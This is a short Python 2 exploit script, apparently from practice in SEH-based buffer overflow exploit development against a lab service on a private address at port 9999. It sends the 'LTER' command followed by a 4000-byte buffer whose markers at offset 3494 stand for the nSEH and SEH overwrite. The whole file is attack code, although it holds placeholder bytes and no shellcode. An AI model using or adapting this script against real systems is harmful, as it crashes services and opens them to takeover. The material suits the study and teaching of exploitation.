#!/usr/bin/python

import socket
import os
import sys

host = "192.168.100.118"
port = 9999

buffer = 'A' * 3494
buffer += 'B' * 4    # nSEH
buffer += 'C' * 4    # SEH
buffer += 'D' * (4000 - 3494 - 4 - 4)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()

